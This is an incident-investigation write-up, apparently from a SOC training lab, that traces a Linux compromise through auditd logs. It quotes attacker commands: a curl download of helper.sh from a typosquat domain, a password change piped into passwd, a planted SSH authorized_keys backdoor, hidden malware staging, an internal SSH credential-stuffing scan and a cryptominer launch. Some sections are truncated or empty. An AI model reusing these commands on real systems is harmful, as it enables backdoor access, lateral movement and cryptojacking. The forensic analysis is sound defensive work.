## Executive Summary

Investigated suspicious process activity on a compromised Linux endpoint 
by analysing auditd logs. The goal was to identify what scripts were 
executed, how they were introduced, and what commands they ran.

<Callout type="key">
  **KEY INSIGHT:** auditd captures every `execve` syscall at the kernel 
  level. Shell history can be deleted. auditd logs cannot be tampered 
  with from userspace. That asymmetry is what makes this the ground 
  truth of what actually ran on a system.
</Callout>

## Investigation Approach

Personally, I like to visually explore the data and get to know the 
specific fields I will be dealing with. This approach allows me to 
apply filters to fields of interest. The command to display the data 
varies depending on the tool and the type of logs being handled.

For this case, since I was dealing with Linux logs and the auditd tool, 
some experience with `grep` and `awk` proved pivotal — especially when 
creating temporary tables with fields of interest.

To visualize the log I used `ausearch -i -if` followed by the path to 
where the logs are located.

```c
-i    → interpret results (makes output human-readable)
-if   → allocate the file ausearch is supposed to read
```

![log fuzzing](/log-fuzzing.png)

By skimming through the command output, some fields caught my attention. 
Some were new to me and required additional research. Fields like 
**EXECVE**, **PPID**, **PID**, and **proctitle** I had covered earlier 
in this [case study](https://soc-portfolio-website-a88y.vercel.app/case-studies/understanding-syscalls).

Here is a summary of each field I interacted with:

| Field | Meaning |
|---|---|
| `a0` | The binary or interpreter that was executed |
| `a1` | The first argument passed — often the script name |
| `a2`, `a3` | Further arguments (flags, URLs, paths) |
| `argc` | Total number of arguments including `a0` |
| `cwd` | Current working directory at time of execution |
| `proctitle` | Full human-readable command as executed |
| `ppid` / `pid` | Parent and child process IDs — trace the chain |
| `auid` | Audit UID — the original logged-in user, even after `su` |

<Callout type="key">
  **CWD is the key to resolving relative paths.** If `a1=debug.sh` has 
  no leading slash, the `cwd` field tells me the directory it ran from — 
  giving me the full absolute path.
</Callout>

## Section 1 — Investigation Walkthrough

### Phase 1: Identifying the Script

Identifying the script was my entry point to this investigation, as it 
was the alert the SIEM raised. I prefer starting from the known and 
working toward the unknown rather than hunting blindly. To filter for 
the script I used the **proctitle** field alongside some filters. The 
reason for choosing `proctitle` is straightforward — it displays the 
full human-readable command that was executed. For the filters I 
included extensions such as `.py`, `.pl`, `.rb`, and `.sh`.

```c
ausearch -i -x "proctitle=" | grep -E "\.(sh|py|pl|rb|bash)"
```

The `-E` flag enables extended regular expressions, allowing the use 
of the `|` (OR) operator without excessive escaping. 
`\.(sh|py|pl|rb|bash)` matches a literal dot `.` followed by any of 
the listed extensions (shell, Python, Perl, Ruby, bash).

The above command did not match anything in the logs.

![no Matches](/no-match.png)

At this point I began hunting the script manually by looking for 
individual phrases in the logs. With `python`/`py`, `perl`/`pl`, and 
`rb` I got nothing, but searching for `bash`/`sh` produced results.

Logs containing the `bash` keyword were displayed, and after inspecting 
both the first and second arguments I noticed this pattern: 
`argc=2 a0=bash a1=debug.sh`. The current working directory and 
`syscall=execve` were also worth noting. All `syscall=execve` calls 
showed `success=yes`, confirming that the script execution completed 
successfully.

`subj=unconfined` indicates that AppArmor is not enforcing on these 
processes. SELinux and AppArmor are Mandatory Access Control (MAC) 
security frameworks for Linux and act as an extra layer of security 
on top of standard Linux file permissions.

#### How Normal Linux Permissions Work (Without MAC)

```c
User → Has root or file permission? → YES → Access granted
```

If a process runs as root, it can do almost anything.

#### What MAC Adds

```c
User → Has permission? → YES → Does policy ALSO allow it? → YES → Access granted
```

Even root can be restricted. A compromised service cannot escape its 
defined boundaries.

![Pattern recognition](/pattern-recognition.png)

In both Linux and Windows, understanding the concept of parent-child 
relationships between processes is crucial. It allows one to visualise 
what happened and what spawned what. In Windows an external tool such 
as Process Hacker is needed, but in Linux commands like `pstree` or 
the `/proc` virtual filesystem can be used.

To hunt for PID 3759 I issued:

```c
pstree 3759
```

I got nothing. I even checked whether the command was installed on the 
system. It then occurred to me that I was interacting with a log file 
and not a live operating system.

![mistake 1](/mistake_1.png)

I went back to using **ausearch** and queried the PID directly:

```c
ausearch -i --pid 3759
```

<Callout type="key">
  **KEY INSIGHT:** The reason for searching by `pid` rather than `ppid` 
  3759 is that searching by `ppid=3759` returns the same log seen 
  earlier. The workaround is to look for instances where the parent 
  process was itself a child of another process.
</Callout>

![pid filter results](/pid-filter-1.png)

From the output I could see the process had a parent that spawned it. 
From the first argument `a0=-bash` and `tty=pts2` I confirmed that 
the malicious activity was carried out through an interactive shell 
and that access to the system was via a remote terminal session, not 
a physical console. The next step was to move one level higher and 
examine the parent of this process by filtering for `ppid=3758`.

```c
ausearch -i --ppid=3758
```

![repeated pattern](/pettern-repeate2.png)

The above filter showed a repeated pattern observed earlier — the 
current working directory `cwd=/home/itsupport` — and the return 
was the exact same audit record as `pid 3759`.

<Callout type="key">
  **KEY INSIGHT:** Querying by `ppid=3758` returns only PID 3759 as 
  its child.
</Callout>

| Finding | Significance |
|---|---|
| PID 3758 spawned only one child — PID 3759 | No other suspicious processes branched from it |
| Both queries (pid & ppid) return the same record | The audit trail is consistent, no gaps |
| PID 3758 itself has no audit record of its own | Not captured by execve auditing — may have existed before audit logging began, or is a process that did not trigger an exec call |

### The Critical Gap — PID 3758 Is a Ghost Process

```c
PID 3758 → spawned → PID 3759 (bash, itsupport) → ran → debug.sh
The question that remains: what is this process?
```

PID 3758 having no audit record suggests it could be:

- An SSH daemon (`sshd`) that handled the incoming connection
- A persistent backdoor or reverse shell that pre-dated audit logging
- A process that spawned bash without using `execve` (evasion technique)

From here I had two options:

```c
# 1. Check SSH daemon logs or filter for SSH in the log file
# 2. Examine the script found earlier
```

The next step was to run `sudo cat /home/itsupport/debug.sh`. The 
script itself was not overtly malicious — it resembled a legitimate 
IT diagnostic tool based on the commands it contained. One rule of 
thumb I learned in threat hunting is to verify everything. The 
comments and commands used can be social engineering designed to 
discourage inspection.

![discovery script](/discovery-script.png)

At this point I became uncertain about where to go next. I realised 
I was hunting with limited clues and needed a clearer path. In threat 
hunting, mapping each finding to the MITRE ATT&CK framework is crucial 
because all attacks follow a predefined path — what changes is the 
techniques and tools used. I decided to map everything found so far.

The discovery commands observed mapped directly to the Discovery tactic: 
`T1083`, `T1057`, and `T1082`. At this stage, adversaries gather 
information about the system that could be used to identify potential 
data to collect.

It was at this point I discovered that the SIEM rules needed fine-tuning. 
The rules had missed the initial access phase entirely and only triggered 
at the discovery phase. I needed to go back into the logs and dig deeper 
on `ssh` and `hostname`. The presence of `tty=pts2` confirmed the 
activity was carried out through an interactive shell via a remote 
terminal session, not a physical console.

This allowed me to pivot the investigation toward filtering for 
`hostname` and `sshd`.

#### The Root Compromise — `45.9.148.125`

At `21:13:33` the IP `45.9.148.125` successfully authenticated as 
**root** via SSH and was assigned terminal `pts/1`. Within seconds, 
three corroborating audit events confirmed the session:

- `USER_AUTH` — authentication granted
- `USER_LOGIN` — session opened on `pts/1`
- `CRED_REFR` — credentials refreshed, session established

`pts` stands for Pseudo Terminal Slave — a virtual terminal created 
by the Linux kernel to represent a remote or non-physical terminal 
session. When someone connects remotely via SSH, the kernel creates 
a master/slave pair: the PTM (Pseudo Terminal Master) is the SSH 
daemon side managing the connection, and the PTS is the user-facing 
shell side that appears in logs.

The terminal number also matters:

| Terminal | Meaning |
|---|---|
| `pts/0` | First remote session opened |
| `pts/1` | Second remote session — root attacker session |
| `pts/2` | Third remote session — `itsupport` session |
| `pts/3` | Fourth remote session — `ubuntu` user session |

```c
tty=(none)  → background/daemon process, no terminal attached
tty=pts/N   → interactive remote session (SSH)
tty=ttyN    → physical local console
tty=cron    → scheduled task, no terminal
```

What followed at `21:15:01` was the most alarming entry — a `CRED_REFR` 
event triggered not by `sshd` but by **cron**, with `terminal=cron`. 
This indicated the attacker had planted a cron-based persistence 
mechanism within two minutes of gaining root access.

<Callout type="key">
  **KEY INSIGHT:** The cron event at 21:15:01 firing within 2 minutes 
  of root login is a strong indicator of automated persistence 
  deployment. Attackers commonly pre-stage cron payloads that activate 
  immediately upon gaining the required privilege level.
</Callout>

I attempted to filter for cron `execve` calls to identify what binary 
or script it launched, but got nothing. I also tried to reconstruct 
the process tree downward and check for a modified crontab — both 
hit dead ends. I then broadened the search by filtering for all logs 
associated with session 40.

#### What This Sequence Reveals

**Part 1 — MOTD Execution (Automatic on Login)**

```c

```

Everything from `run-parts` through the numbered MOTD scripts 
(`00-`, `50-`, `85-`, `90-`, `98-`) is standard Ubuntu login

**Part 2 — Reconnaissance Begins**


<Callout type="key">
  **KEY INSIGHT:** The SFTP server was invoked interactively within 
  the attacker's session. This strongly indicates the attacker used 
  SFTP to transfer files to or from the system — either uploading 
  tools and payloads, or exfiltrating data.
</Callout>

Filtering for any SFTP activity in the logs:

```c
ausearch -i -if /home/ubuntu/scenario/audit.log | grep "sftp"
```

The log returned:

```c
proctitle=bash -c /usr/lib/openssh/sftp-server
argc=3  a0=bash  a1=-c  a2=/usr/lib/openssh/sftp-server
```

The presence of the `-c` flag proved that bash was told to execute 
a specific command string directly. This was not a standard 
system-initiated SFTP daemon. Recognising the difference between 
normal and abnormal requires knowing what each looks like. A standard 
SFTP session is initiated by `sshd` directly — no bash wrapper, no 
`-c` flag. What appeared here was someone picking up the SFTP binary 
themselves and running it manually.

### Phase 6: Command Summary — Getting the Full Picture

At this point the `ses=40` filters were returning limited results. 
Most queries had no matches, and the one `syscall=write` that returned 
belonged to `sshd` itself — not a file operation. The file descriptor 
it was writing to was `fd=3`, an open socket or pipe, and only 1 byte 
was written. This is internal SSH protocol communication, not file I/O.

<Callout type="key">
  **KEY INSIGHT:** File descriptors 0, 1, and 2 are stdin, stdout, and 
  stderr. `fd=3` is the first opened resource — in SSH context this is 
  almost always the network socket. Writing 1 byte to a socket is a 
  protocol handshake, not a file write. To learn more about file 
  descriptors and syscalls, check this 
  [case study](https://soc-portfolio-website-a88y.vercel.app/case-studies/understanding-syscalls).
</Callout>

Rather than continuing to filter blindly, I stepped back and pulled 
a high-level summary of every command that executed across the entire

The `--comm` flag reports on commands, `--summary` aggregates by

#### `curl` — Malicious Download Confirmed

The `curl` result returned one entry that was immediately alarming:

```c
proctitle=curl http://drobbox-online.thm/helper.sh -O /var/tmp/helper.sh
argc=4  a0=curl  a1=http://drobbox-online.thm/helper.sh
        a2=-O    a3=/var/tmp/helper.sh
cwd=/home/ubuntu
auid=ubuntu  uid=ubuntu  ses=174  tty=pts3
time: 09/11/25 18:49:39
```

| Field | Value | Significance |
|---|---|---|
| Domain | `drobbox-online.thm` | Typosquat of Dropbox — fake domain mimicking legitimate cloud storage |
| File | `helper.sh` | Generic name designed to look benign |
| Flag `-O` | Save to disk | Explicitly downloading and writing the file |
| Save path | `/var/tmp/helper.sh` | `/var/tmp` persists across reboots — chosen deliberately |

### Phase 8: `helper.sh` — The Full Attack Revealed

Examining the contents of `helper.sh` transformed the investigation 
from a collection of suspicious indicators into a complete, named 
attack chain. The script was not a generic backdoor — it was a 
structured, multi-stage intrusion tool.

```bash
# Checks CPU and RAM information
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
lscpu | grep Model
# Unclear purpose
ls -lh $(which ls)
# Generic Discovery
crontab -l
w
uname -m
```

The script opened with hardware and system enumeration — consistent 
with the recon commands seen throughout `ses=40` and the earlier 
`debug.sh` execution. The attacker was profiling the system to 
determine whether it was worth fully compromising.

#### Stage 1 — Credential Manipulation

```bash
echo -e "ubuntu123\nN2a96PU0mBfS\nN2a96PU0mBfS"|passwd|bash
```

This single line attempted to change the current user's password by 
piping credentials directly into `passwd`. The output was appended 
to `up.txt` — a credentials file used in a later stage.

| Element | Purpose |
|---|---|
| `ubuntu123` | Current password attempt |
| `N2a96PU0mBfS` | New password being set |
| `passwd\|bash` | Pipes result — ensures execution continues |
| `>> up.txt` | Saves outcome to credentials file |

#### Stage 2 — SSH Backdoor Implanted

```bash
cd ~
rm -rf .ssh
mkdir .ssh
echo "ssh-rsa [ssh-key] mdrfckr" >> .ssh/authorized_keys
chmod -R go= ~/.ssh
```

The attacker wiped the existing `.ssh` directory and replaced it with 
one containing their own public key. The `chmod -R go=` removed all 
group and other permissions — locking out everyone except the key holder.

<Callout type="key">
  **KEY INSIGHT:** The string `mdrfckr` appended to the SSH key as a 
  comment is unique to this specific attack campaign. It acts as an 
  attacker signature and is a known indicator of compromise for this 
  malware family — searchable in threat intelligence platforms.
</Callout>

#### Stage 3 — Malware Staging

```bash
cd /tmp
rm -rf .X2*
mkdir .X26-unix
cd .X26-unix
tar xf dota3.tar.gz
sleep 3s
cd /tmp/.X26-unix/.rsync/c
```

| Action | Significance |
|---|---|
| `rm -rf .X2*` | Removes any prior infection or competing malware |
| `mkdir .X26-unix` | Hidden directory — dot prefix conceals from casual `ls` |
| `tar xf dota3.tar.gz` | Unpacks the malware archive |
| `.rsync/c` | Disguised as rsync — a legitimate-looking folder name |

The archive `dota3.tar.gz` was the malware payload. Its name was 
deliberately chosen to appear as a gaming or system file. This also 
connected directly back to the `tar ×6` and `gzip ×1` entries seen 
in the `aureport` command summary.

#### Stage 4 — Internal Network Scanning

```bash
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 192.168 \
  >> /dev/null 2>1&
sleep 8m
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 172.16 \
  >> /dev/null 2>1&
sleep 20m
```

`tsm` was a credential-stuffing SSH scanner that used the `up.txt` 
credentials file built in Stage 1 to attempt authentication against 
every host on the internal network ranges.

| Element | Purpose |
|---|---|
| `nohup` | Runs detached — survives terminal disconnect |
| `-p 22` | Targets SSH port |
| `/tmp/up.txt` | Credential list built from the passwd stage |
| `>> /dev/null 2>1&` | Suppresses all output — silent execution |
| `sleep 8m / 20m` | Staggers scans to avoid detection |

The compromised host was now being used as a launchpad to attack other 
machines on the same network using the credentials harvested from the 
system itself.

#### Stage 5 — Cryptominer Deployed

```bash
cd ..; nohup /tmp/.X26-unix/.rsync/initall 2>1&
exit 0
```

The final payload was `initall` — a cryptominer disguised with a name 
that mimicked a system initialisation binary. It ran detached via 
`nohup`, ensuring it continued after the session ended.
